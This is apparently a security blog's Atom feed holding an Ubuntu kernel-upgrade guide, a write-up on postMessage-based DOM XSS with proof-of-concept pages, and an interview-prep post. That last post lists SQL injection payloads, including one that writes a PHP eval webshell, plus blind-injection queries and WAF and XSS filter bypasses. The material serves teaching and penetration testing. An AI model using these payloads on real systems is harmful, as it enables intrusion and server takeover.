<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>RainSec</title>
  
  
  <link href="https://rainsec.cn/atom.xml" rel="self"/>
  
  <link href="https://rainsec.cn/"/>
  <updated>2022-07-14T08:10:50.923Z</updated>
  <id>https://rainsec.cn/</id>
  
  <author>
    <name>RainSec</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Ubuntu 20.04更新内核到指定版本</title>
    <link href="https://rainsec.cn/post/Ubuntu20.04%20%E5%8D%87%E7%BA%A7%E9%99%8D%E7%BA%A7%E5%86%85%E6%A0%B8%E5%88%B0%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC.html"/>
    <id>https://rainsec.cn/post/Ubuntu20.04%20%E5%8D%87%E7%BA%A7%E9%99%8D%E7%BA%A7%E5%86%85%E6%A0%B8%E5%88%B0%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC.html</id>
    <published>2022-03-28T08:40:40.000Z</published>
    <updated>2022-07-14T08:10:50.923Z</updated>
    
    <content type="html"><![CDATA[<p>记一次更新内核到5.8.0-33-generic</p><span id="more"></span><h2 id="更新到指定版本"><a href="#更新到指定版本" class="headerlink" title="更新到指定版本"></a>更新到指定版本</h2><h3 id="查看当前版本"><a href="#查看当前版本" class="headerlink" title="查看当前版本"></a>查看当前版本</h3><pre><code class="shell">$ uname -r4.15.0-101-generic$ lsb_release -aNo LSB modules are available.Distributor ID: UbuntuDescription:    Ubuntu 20.04 LTSRelease:        20.04Codename:       focal</code></pre><h3 id="查看当前已经安装的-Kernel-Image"><a href="#查看当前已经安装的-Kernel-Image" class="headerlink" title="查看当前已经安装的 Kernel Image"></a>查看当前已经安装的 Kernel Image</h3><pre><code class="shell">$ dpkg --get-selections |grep linux-imagelinux-image-5.4.0-90-generic                    purgelinux-image-5.8.0-33-generic                    installlinux-image-generic                             install</code></pre><h3 id="查询当前软件仓库可以安装的-Kernel-Image-版本，如果没有预期的版本，则需要额外配置仓库"><a href="#查询当前软件仓库可以安装的-Kernel-Image-版本，如果没有预期的版本，则需要额外配置仓库" class="headerlink" title="查询当前软件仓库可以安装的 Kernel Image 版本，如果没有预期的版本，则需要额外配置仓库"></a>查询当前软件仓库可以安装的 Kernel Image 版本，如果没有预期的版本，则需要额外配置仓库</h3><pre><code class="shell">$ apt-cache search linux | grep linux-image</code></pre><h3 id="安装指定版本的-Kernel-Image-和-Kernel-Header"><a href="#安装指定版本的-Kernel-Image-和-Kernel-Header" class="headerlink" title="安装指定版本的 Kernel Image 和 Kernel Header"></a>安装指定版本的 Kernel Image 和 Kernel Header</h3><pre><code class="shell">$ sudo apt-get install linux-headers-5.8.0-33-generic linux-image-5.8.0-33-generic</code></pre><h3 id="查看当前的Kernel列表"><a href="#查看当前的Kernel列表" class="headerlink" title="查看当前的Kernel列表"></a>查看当前的Kernel列表</h3><pre><code class="shell">$ grep menuentry /boot/grub/grub.cfgif [ x"${feature_menuentry_id}" = xy ]; then  menuentry_id_option="--id"  menuentry_id_option=""export menuentry_id_optionmenuentry 'Ubuntu' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-simple-b986dc3b-6b82-44d5-acb8-6cbad5e357d5' {submenu 'Advanced options for Ubuntu' $menuentry_id_option 'gnulinux-advanced-b986dc3b-6b82-44d5-acb8-6cbad5e357d5' {        menuentry 'Ubuntu, with Linux 5.8.0-33-generic' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-5.8.0-33-generic-advanced-b986dc3b-6b82-44d5-acb8-6cbad5e357d5' {        menuentry 'Ubuntu, with Linux 5.8.0-33-generic (recovery mode)' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-5.8.0-33-generic-recovery-b986dc3b-6b82-44d5-acb8-6cbad5e357d5' {        menuentry 'Ubuntu, with Linux 5.4.0-90-generic' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-5.4.0-90-generic-advanced-b986dc3b-6b82-44d5-acb8-6cbad5e357d5' {        menuentry 'Ubuntu, with Linux 5.4.0-90-generic (recovery mode)' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-5.4.0-90-generic-recovery-b986dc3b-6b82-44d5-acb8-6cbad5e357d5' {</code></pre><h3 id="修改-Kernel-的启动顺序：如果安装的是最新的版本，那么默认就是首选的；如果安装的是旧版本，就需要修改-grub-配置"><a href="#修改-Kernel-的启动顺序：如果安装的是最新的版本，那么默认就是首选的；如果安装的是旧版本，就需要修改-grub-配置" class="headerlink" title="修改 Kernel 的启动顺序：如果安装的是最新的版本，那么默认就是首选的；如果安装的是旧版本，就需要修改 grub 配置"></a>修改 Kernel 的启动顺序：如果安装的是最新的版本，那么默认就是首选的；如果安装的是旧版本，就需要修改 grub 配置</h3><pre><code class="shell">$ sudo vim /etc/default/grub# GRUB_DEFAULT=0GRUB_DEFAULT="Advanced options for Ubuntu&gt;Ubuntu, with Linux 5.8.0-33-generic"</code></pre><h3 id="生效配置"><a href="#生效配置" class="headerlink" title="生效配置"></a>生效配置</h3><pre><code class="shell">$ update-grub$ reboot</code></pre><h2 id="删除不需要的Kernel"><a href="#删除不需要的Kernel" class="headerlink" title="删除不需要的Kernel"></a>删除不需要的Kernel</h2><h3 id="查询不包括当前内核版本的其它所有内核版本"><a href="#查询不包括当前内核版本的其它所有内核版本" class="headerlink" title="查询不包括当前内核版本的其它所有内核版本"></a>查询不包括当前内核版本的其它所有内核版本</h3><pre><code class="shell">$ dpkg -l | tail -n +6| grep -E 'linux-image-[0-9]+'| grep -Fv $(uname -r)pi  linux-image-5.4.0-90-generic         5.4.0-90.101                      amd64        Signed kernel image generic</code></pre><p>Kernel 状态：</p><ul><li>rc：表示已经被移除</li><li>ii：表示符合移除条件（可移除）</li><li>iU：已进入 apt 安装队列，但还未被安装（不可移除）</li></ul><h3 id="删除指定的Kernel"><a href="#删除指定的Kernel" class="headerlink" title="删除指定的Kernel"></a>删除指定的Kernel</h3><pre><code class="shell">dpkg --purge linux-image-5.4.0-90-generic</code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;记一次更新内核到5.8.0-33-generic&lt;/p&gt;</summary>
    
    
    
    
    <category term="Kernel" scheme="https://rainsec.cn/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>EventListener XSS</title>
    <link href="https://rainsec.cn/post/EventListener%20XSS.html"/>
    <id>https://rainsec.cn/post/EventListener%20XSS.html</id>
    <published>2022-03-25T10:38:45.000Z</published>
    <updated>2022-07-20T04:02:38.394Z</updated>
    
    <content type="html"><![CDATA[<p><strong>EventListener XSS</strong><br>XSS作为混”低保“的最佳漏洞，我们在日常测试中没少碰到，但是<code>DOM</code>型XSS就相对来说不容易被发现了，而本文要介绍的则是更难发现并利用的监听<code>postMessage</code>所导致漏洞。首先从事件监听器开始说起</p><h2 id="事件监听器"><a href="#事件监听器" class="headerlink" title="事件监听器"></a>事件监听器</h2><p>事件监控器可以为指定对象设置一个回调函数，当该对象的指定事件被触发时会被执行：</p><pre><code class="HTML">&lt;table id="outside"&gt;    &lt;tr&gt;&lt;td id="t1"&gt;one&lt;/td&gt;&lt;/tr&gt;    &lt;tr&gt;&lt;td id="t2"&gt;two&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;script&gt;function modifyText() {  var t2 = document.getElementById("t2");  if (t2.firstChild.nodeValue == "three") {    t2.firstChild.nodeValue = "two";  } else {    t2.firstChild.nodeValue = "three";  }}// 为table添加事件监听器var el = document.getElementById("outside");el.addEventListener("click", modifyText, false);&lt;/script&gt;</code></pre><p>以上代码监听了<code>table</code>的<code>click</code>事件，当点击<code>table</code>时会触发<code>modifyText</code>,下面链接列出了所有的事件:</p><p><a href="https://developer.mozilla.org/en-US/docs/Web/Events#event_index">https://developer.mozilla.org/en-US/docs/Web/Events#event_index</a></p><p>这里要说的是<code>postMessage</code>与其对应的事件监听器在不安全配置情况下导致的漏洞，首先看下<code>postMessage</code>的介绍：</p><p>&gt; window.postMessage() 方法可以安全地实现跨源通信。通常，对于两个不同页面的脚本，只有当执行它们的页面位于具有相同的协议（通常为https），端口号（443为https的默认值），以及主机 (两个页面的模数 <code>Document.domain</code>设置为相同的值) 时，这两个脚本才能相互通信。window.postMessage() 方法提供了一种受控机制来规避此限制，只要<strong>正确的使用</strong>，这种方法就很安全。 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage">https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage</a></p><p>它的用法也很简单：</p><pre><code>windows.postMessage(message, targetOrigin, [transfer])</code></pre><ul><li><p>windows是指一个窗口，可以是当前页面的<code>window</code>、<code>window.open</code>返回的窗口对象、<code>iframe</code>的<code>contentWindow</code>属性等</p></li><li><p>message是要发送的消息，可以是字符串，也可以是<code>json</code>格式</p></li><li><p><code>targetOrigin</code>用来指定哪个窗口可以接收到消息，如果为<code>*</code>则表示任意窗口均可收到信息。而如果指定了特定的域名后要求发送消息的窗口其协议、端口、主机地址与指定域名匹配才可发送消息。</p></li></ul><p>发送消息事件可以通过如下方式添加监听事件：</p><pre><code class="JavaScript">window.addEventListener("message", receiveMessage, false);function receiveMessage(event){}</code></pre><p>当发送信息时就会触发<code>receiveMessage</code>。其中<code>event</code>的属性比较重要的有：</p><ul><li><p>data 即<code>postMessage</code>发送的数据</p></li><li><p>origin 发送信息窗口的<code>origin</code></p></li></ul><h2 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h2><p>比起原理，大家肯定对漏洞如何利用更感兴趣。看下面这段代码</p><pre><code class="HTML">&lt;html&gt;  &lt;head&gt;&lt;title&gt;Toxic DOM&lt;/title&gt;&lt;/head&gt;  &lt;body&gt;    &lt;script&gt;      var postMessageHandler = function(msg) {  var content = msg.data;  var msgObj = eval(content);  if (msgObj.isActive) {    document.write("PostMessage arrived!");  }}window.addEventListener('message', postMessageHandler, false);    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;&lt;!-- https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval --&gt;</code></pre><p>很明显可以看出这个页面在监听到<code>postMessage</code>时会调用<code>eval</code>执行发送的信息，那我们就可以构造<code>payload</code>了</p><pre><code class="HTML">&lt;script&gt;                    function pocLink() {                        let win = window.open('https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval');                        let msg = "alert(1);";                        setTimeout(function(){                            win.postMessage(msg, '*');                        }, 5000);                    }&lt;/script&gt; &lt;a href="#" onclick="pocLink();"&gt;PoC link&lt;/a&gt;         </code></pre><p>或者是使用<code>iframe</code></p><pre><code class="HTML">&lt;script&gt;  function pocFrame(win) {               let msg = "alert(1);";    win.postMessage(msg, '*');            }&lt;/script&gt; &lt;iframe src="https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval" onload="pocFrame(this.contentWindow)"&gt;&lt;/iframe&gt;    </code></pre><p>也就是说我们需要在自己服务器上新建一个页面，用来打开一个新窗口或是加载一个<code>iframe</code>并获取其句柄，用来传递信息。当打开的窗口中存在有<code>message</code>监听，且其触发代码有可利用点时就可以触发漏洞。</p><h2 id="工具检测"><a href="#工具检测" class="headerlink" title="工具检测"></a>工具检测</h2><p>纯手工发现漏洞不可取，<code>Burp</code>的<code>DOM Invader</code>就可以帮助发现此类问题</p><p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image20.1l50zy96mokg.png" alt="img"></p><p>对于<code>https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval</code> 它可以直接检测出漏洞存在并一键生成<code>POC</code></p><p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image21.n4byv2n2acw.png" alt="img"></p><p>为了了解原理最好可以看看它的代码，但是其源码做了混淆，没办法了解它的原理，所以我们从它的平替<a href="https://github.com/fransr/postMessage-tracker">postMessage-tracker</a>入手进行分析。 其检测结果展示形式为</p><p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image22.6qq7cqyazzg0.png" alt="img"></p><p>平平无奇的一个小框框，相较于<code>DOM Invader</code>的可利用性分析差了许多，不过仅仅了解下原理已然足够了。</p><p>它的目录结构非常简单，首先看下<code>mainfest.json</code></p><p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image23.1tng48w41gyo.png" alt="img"></p><p><code>run_at</code>表明注入在<code>css</code>之后，<code>dom</code>构建之前。关键代码在<code>content_script.js</code>当中：</p><p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image24.6br43k6e3x00.png" alt="img"></p><p>这一段的主要作用就是在添加监听器前判断其类型是否时<code>message</code>，如果是则记录下来一些数据，比如此时的堆栈信息等。合理推测<code>Burp</code>在此之上加入了危险函数判断的操作，后续有空的话就给<code>DOM Invader</code>加一个类似的功能练练手吧，日常使用当然还是<code>Burp</code>的香啊~</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><p><a href="https://github.com/fransr/postMessage-tracker">https://github.com/fransr/postMessage-tracker</a></p></li><li><p><a href="https://portswigger.net/burp/documentation/desktop/tools/dom-invader">https://portswigger.net/burp/documentation/desktop/tools/dom-invader</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;EventListener XSS&lt;/strong&gt;&lt;br&gt;XSS作为混”低保“的最佳漏洞，我们在日常测试中没少碰到，但是&lt;code&gt;DOM&lt;/code&gt;型XSS就相对来说不容易被发现了，而本文要介绍的则是更难发现并利用的监听&lt;code&gt;postMessag</summary>
      
    
    
    
    <category term="Noel" scheme="https://rainsec.cn/categories/Noel/"/>
    
    <category term="Web" scheme="https://rainsec.cn/categories/Noel/Web/"/>
    
    
    <category term="XSS" scheme="https://rainsec.cn/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>信安面试问题准备</title>
    <link href="https://rainsec.cn/post/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87.html"/>
    <id>https://rainsec.cn/post/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87.html</id>
    <published>2022-03-24T16:00:00.000Z</published>
    <updated>2022-07-14T08:10:50.927Z</updated>
    
    <content type="html"><![CDATA[<p>收集一些常见的信息安全面试问题</p><span id="more"></span><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="假如给你一个网站你怎么去渗透"><a href="#假如给你一个网站你怎么去渗透" class="headerlink" title="假如给你一个网站你怎么去渗透"></a>假如给你一个网站你怎么去渗透</h3><pre><code class="plaintext">信息收集首先看是什么类型的网站，针对不同类型的网站有不同的信息搜集方案，如大型企业网站可以用天眼查，启信宝等查询法人股份等信息，小型网站可以查询使用了哪类建站系统1.whois查詢,获取注册者邮箱姓名电话等。2.查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。3.查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞4.查看IP，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,訫脏滴血，mysql,ftp,ssh弱口令等。5.扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针6.google hack进一步探测网站的信息，后台，敏感文件7.查看这个网站都有哪些功能，针对不同的功能可以实现不同的漏洞利用</code></pre><h3 id="whois查詢主要查的是什么"><a href="#whois查詢主要查的是什么" class="headerlink" title="whois查詢主要查的是什么?"></a>whois查詢主要查的是什么?</h3><pre><code class="plaintext">1.域名信息2.注册商3.联系人4.联系邮箱5.网站创建时间6.网站过期时间7.DNS信息8.网站状态拓展：什么是whois？whois可以理解为域名数据库搜索引擎</code></pre><h3 id="nmap命令"><a href="#nmap命令" class="headerlink" title="nmap命令"></a>nmap命令</h3><pre><code class="shell">-p 加端口号或1-65535-sS (TCP SYN扫描)-sT (TCP connect()扫描)-sU (UDP扫描)-sV (版本探测)-O (启用操作系统检测)-f (报文分段); --mtu (使用指定的MTU)-D &lt;decoy1 ，decoy2，...&gt; (使用诱饵隐蔽扫描)-S &lt;IP_Address&gt; (源地址哄骗)</code></pre><h3 id="常见的web容器"><a href="#常见的web容器" class="headerlink" title="常见的web容器"></a>常见的web容器</h3><pre><code>WebLogicWebSphereJBossTomcatIISApacheNginx</code></pre><h3 id="常见中间件漏洞"><a href="#常见中间件漏洞" class="headerlink" title="常见中间件漏洞"></a>常见中间件漏洞</h3><pre><code>1.IIS    1、PUT 漏洞    2、短文件名猜解    3、远程代码执行    4、解析漏洞2.Apache    1、解析漏洞    2、目录遍历3.Nginx    1、文件解析    2、目录遍历    3、CRLF 注入    4、目录穿越4.Tomcat    1、远程代码执行    2、war 后门文件部署5.jBoss    1、反序列化漏洞    2、war 后门文件部署6.WebLogic    1、反序列化漏洞    2、SSRF    3、任意文件上传    4、war 后门文件部署7.其它中间件相关漏洞    1、FastCGI 未授权访问、任意命令执行    2、PHPCGI 远程代码执行</code></pre><h3 id="常见端口及对应服务"><a href="#常见端口及对应服务" class="headerlink" title="常见端口及对应服务"></a>常见端口及对应服务</h3><pre><code></code></pre><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="SQL和NoSQL的优缺点"><a href="#SQL和NoSQL的优缺点" class="headerlink" title="SQL和NoSQL的优缺点"></a>SQL和NoSQL的优缺点</h3><pre><code>SQL 优点：结构稳定、逻辑性强、易于理解SQL 缺点：不适于高并发、不适于海量数据高效读写、维护开销大、相对 nosql 速度慢NoSql 优点：易扩展、数据结构灵活、查询速度快比较：没有好坏之分，只看应用环境。关系型数据库可靠性更强、适用于银行等数据精度要求高的环境。非关系型数据库适用于高并发、大量数据库交互、数据准确度不高的环境。</code></pre><h3 id="常见数据库端口"><a href="#常见数据库端口" class="headerlink" title="常见数据库端口"></a>常见数据库端口</h3><pre><code>关系型：    mysql:3306    sqlserver:1433    orecal:1521    PostgreSQL:5432    db2:50000非关系型：    MongoDB:27017    redis:6379    memcached:11211</code></pre><h3 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h3><pre><code>从注入参数类型分：    数字型注入    字符型注入    搜索型注入从注入方法分：    基于报错    基于布尔盲注    基于时间盲注    联合查询    堆叠注入    宽字节注入从提交方式分：    GET注入    POST注入    COOKIE注入    HTTP头注入</code></pre><h3 id="load-file判断是否有读写权限"><a href="#load-file判断是否有读写权限" class="headerlink" title="load_file判断是否有读写权限"></a>load_file判断是否有读写权限</h3><pre><code class="sql">and (select count(*) from mysql.user)&gt;0/* 如果结果返回正常,说明具有读写权限。and (select count(*) from mysql.user)&gt;0/* 返回错误，应该是管理员给数据库帐户降权</code></pre><h3 id="mysql5-0上下有什么区别"><a href="#mysql5-0上下有什么区别" class="headerlink" title="mysql5.0上下有什么区别"></a>mysql5.0上下有什么区别</h3><pre><code>mysql5.0以下版本没有information_schema这个系统库，无法列出表名列名，只能暴力跑</code></pre><h3 id="MySQL中-和-的区别"><a href="#MySQL中-和-的区别" class="headerlink" title="MySQL中@和@@的区别"></a>MySQL中@和@@的区别</h3><pre><code class="shell">一个@是用户自定义变量两个@是系统变量，如@@version、@@user</code></pre><h3 id="MySQL绕过常用函数"><a href="#MySQL绕过常用函数" class="headerlink" title="MySQL绕过常用函数"></a>MySQL绕过常用函数</h3><pre><code>group_concat() ==&gt; concat_ws()sleep() ==&gt; benchmark()mid()、substr() ==&gt; substring()user() ==&gt; @@userupdatexml() ==&gt; extractvalue()</code></pre><h3 id="SQL注入的危害和修复"><a href="#SQL注入的危害和修复" class="headerlink" title="SQL注入的危害和修复"></a>SQL注入的危害和修复</h3><pre><code>造成敏感信息泄漏，攻击者可以对表数据进行操作。如果有写权限，可以写入木马，可能被getshell。或者被提权修复方案：  sql语句预编译  对输入内容进行转义  使用安全函数</code></pre><h3 id="SQL注入写入webshell的条件和方式"><a href="#SQL注入写入webshell的条件和方式" class="headerlink" title="SQL注入写入webshell的条件和方式"></a>SQL注入写入webshell的条件和方式</h3><pre><code>条件：    要知道网站绝对路径，可以通过报错，phpinfo界面，404界面等一些方式知道    gpc没有开启，开启了单引号被转义了，语句就不能正常执行了    要有file权限，默认情况下只有root有    对目录要有写权限，一般image之类的存放突破的目录就有    方式：    1；union写入        union select into outfile，将一句话写入shell.php，仅适用于联合注入        具体权限要求：secure_file_priv支持web目录文件导出、数据库用户File权限、获取物理路径。        ?id=1 union select 1,"&lt;?php @eval($_POST['g']);?&gt;",3 into outfile 'E:/study/WWW/evil.php'    2.分隔符写入        当Mysql注入点为盲注或报错，Union select写入的方式显然是利用不了的，那么可以通过分隔符写入。SQLMAP的 --os-shell命令，所采用的就是一下这种方式        具体权限要求：secure_file_priv支持web目录文件导出、数据库用户File权限、获取物理路径。        ?id=1 INTO OUTFILE '物理路径' lines terminated by  （一句话hex编码）#        ?id=1 INTO OUTFILE '物理路径' fields terminated by （一句话hex编码）#        ?id=1 INTO OUTFILE '物理路径' columns terminated by （一句话hex编码）#        ?id=1 INTO OUTFILE '物理路径' lines starting by    （一句话hex编码）#    3.log写入        新版本的MySQL设置了导出文件的路径，很难在获取Webshell过程中去修改配置文件，无法通过使用select into outfile来写入一句话。这时，我们可以通过修改MySQL的log文件来获取Webshell。        具体权限要求：数据库用户需具备Super和File服务器权限、获取物理路径。</code></pre><h3 id="sql注入过滤了逗号"><a href="#sql注入过滤了逗号" class="headerlink" title="sql注入过滤了逗号"></a>sql注入过滤了逗号</h3><pre><code class="sql">/*1.join绕过*/union select * from ((select 1)A join (select 2)B join (select 3)C join (select group_concat(user(),' ',database(),' ',@@datadir))D);/*2.对于mid()和substr()函数，可以使用from for*/select substr(database() from 1 for 1);select mid(database() from 1 for 1);/*3.对于limit可以用offset*/limit 0,1 ==&gt; limit 1 offset 0</code></pre><h3 id="sleep被禁用后还能怎么进行sql注入（延时函数都有哪些？）"><a href="#sleep被禁用后还能怎么进行sql注入（延时函数都有哪些？）" class="headerlink" title="sleep被禁用后还能怎么进行sql注入（延时函数都有哪些？）"></a>sleep被禁用后还能怎么进行sql注入（延时函数都有哪些？）</h3><pre><code class="sql">/*1.benchmark代替sleep*/id=1 and if(ascii(substring((database()),1,1))=115,(select benchmark(10000000,md5(0x41))),1) --+/*2.笛卡尔积盲注*/select * from ctf_test where user='1' and 1=1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C)/*3.RLIKE盲注*/select * from flag where flag='1' and if(mid(user(),1,1)='r',concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+cd',1)</code></pre><h3 id="Select被过滤怎么办"><a href="#Select被过滤怎么办" class="headerlink" title="Select被过滤怎么办"></a>Select被过滤怎么办</h3><pre><code>sel&lt;&gt;ectsele/**/ct/*!%53eLEct*/se%0blectREVERSE(tceles)%53eLEct</code></pre><h3 id="盲注关键的表被过滤了，该怎么办"><a href="#盲注关键的表被过滤了，该怎么办" class="headerlink" title="盲注关键的表被过滤了，该怎么办"></a><font color="green">盲注关键的表被过滤了，该怎么办</font></h3><pre><code class="sql">如果关键的表被禁用了，可以使用这种形式select count(*) from (select 1 union select null unionselect !1) group by concat(version(),floor(rand(0)*2))如果 rand 被禁用了可以使用用户变量来报错select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)</code></pre><h3 id="sql注入常见的过WAF方法"><a href="#sql注入常见的过WAF方法" class="headerlink" title="sql注入常见的过WAF方法"></a><strong>sql注入常见的过WAF方法</strong></h3><pre><code>内联注释绕过填充大量脏数据绕过垃圾参数填充绕过改变提交方式绕过,如GET方式变为POST方式提交随机agent头绕过fuzz过滤函数函数替换绕过</code></pre><h3 id="Mysql-UDF提权"><a href="#Mysql-UDF提权" class="headerlink" title="Mysql UDF提权"></a>Mysql UDF提权</h3><pre><code>原理：  UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样。  条件：  如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下/  如果mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目   录，在windows server 2000下放置在c:\winnt\system32目录。  掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。  拥有可以将udf.dll写入相应目录的权限。</code></pre><h3 id="SQL注入如何判断不同数据库"><a href="#SQL注入如何判断不同数据库" class="headerlink" title="SQL注入如何判断不同数据库"></a>SQL注入如何判断不同数据库</h3><pre><code>1.注释符判断/是 MySQL 中的注释符，返回错误说明该注入点不是 MySQL；继续提交如下查询字符：–是 Oracle 和 MSSQL 支持的注释符，如果返回正常，则说明为这两种数据库类型之一。继续提交如下查询字符：;是子句查询标识符，Oracle 不支持多行查询，因此如果返回错误，则说明很可能是 Oracle 数据库。2.函数判断and (select count()from MSysAccessObjects)&gt;0 access 数据库and (select count()from sysobjects)&gt;0 返回正常说明是 mssql 数据库and length(user())&gt;10 返回正常说明是 MysqlOracle 可以根据 from dual 虚拟库判断3.根据语言和中间件常识Asp 和.net 通常使用 sqlserverPhp 通常使用 mysql 或者 postgresqlJava 通常是 oracle 或 mysqlIIS 服务器是基于 windows 的架构，后台数据库有可能是 sqlserverApache 服务器，可能使用开源数据库 mysql 或 postgresql</code></pre><h3 id="预编译是否100-能防御SQL注入"><a href="#预编译是否100-能防御SQL注入" class="headerlink" title="预编译是否100%能防御SQL注入"></a><font color="green">预编译是否100%能防御SQL注入</font></h3><pre><code class="sql">预编译原理：先将查询语句固定通过函数将传参变为字符串拼接字符串去执行你的关键字根本不会当作关键字去执行$pdo-&gt;query(‘SET NAMES gbk’);$var = “\xbf\x27 OR 1=1 /“;$query = ‘SELECT FROM test WHERE name = ? LIMIT 1’;$stmt = $pdo-&gt;prepare($query);$stmt-&gt;execute(array($var)); 类似于宽字节注入</code></pre><h3 id="发现-demo-jsp-uid-110-注入点，你有哪几种思路获取-webshell"><a href="#发现-demo-jsp-uid-110-注入点，你有哪几种思路获取-webshell" class="headerlink" title="发现 demo.jsp?uid=110 注入点，你有哪几种思路获取 webshell"></a>发现 demo.jsp?uid=110 注入点，你有哪几种思路获取 webshell</h3><pre><code>(1)有写入权限的，构造联合查询语句使用 using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell(2)使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高(3)通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell</code></pre><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="XSS的分类"><a href="#XSS的分类" class="headerlink" title="XSS的分类"></a>XSS的分类</h3><pre><code>1.反射型    发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。2.存储型    存储型XSS和反射型XSS的差别仅在于，提交的代码会存储在服务端（数据库，内存，文件系统等），下次请求目标页面时不用再提交XSS代码。（例如：常见的评论，在文本框中输入一段代码，那么就会存放在数据库当中，当再次加载的时候便会执行这样的代码）3.DOM型XSS</code></pre><h3 id="如何预防XSS"><a href="#如何预防XSS" class="headerlink" title="如何预防XSS"></a>如何预防XSS</h3><pre><code>过滤一些危险字符，以及转义&amp; &lt; &gt; " ' /等危险字符HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此Cookie。设置CSP(Content Security Policy)输入内容长度限制</code></pre><h3 id="XSS和CSRF、SSRF的区别"><a href="#XSS和CSRF、SSRF的区别" class="headerlink" title="XSS和CSRF、SSRF的区别"></a>XSS和CSRF、SSRF的区别</h3><pre><code>相同：三种Web服务端漏洞均是服务器对用户提供的可控数据过于信任或过滤不严导致的不同：    XSS是服务器对用户输入的数据没有进行足够的过滤，导致客户端浏览器在渲染服务器返回前端页面出现了预期之外的脚本语句执行    CSRF是服务器没对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者利用用户cookie信息伪造用户请求发送至服务器    SSRF是服务器对用户提交的可控URL过于信任，没有对攻击者提供的url进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或其他服务器</code></pre><h3 id="除了alert函数，还可以使用哪些函数弹窗"><a href="#除了alert函数，还可以使用哪些函数弹窗" class="headerlink" title="除了alert函数，还可以使用哪些函数弹窗"></a>除了alert函数，还可以使用哪些函数弹窗</h3><pre><code>prompt(),confirm()</code></pre><h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><pre><code class="html">1.过滤空格：    用/代替空格2.关键字过滤：    双写绕过    大小写绕过    字符串拼接：&lt;img src="x" onerror="a=`aler`;b=`t`;c='(`xss`);';eval(a+b+c)"&gt;    编码绕过        Unicode编码绕过：&lt;img src="x" onerror="&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;"&gt;        URL编码绕过：&lt;img src="x" 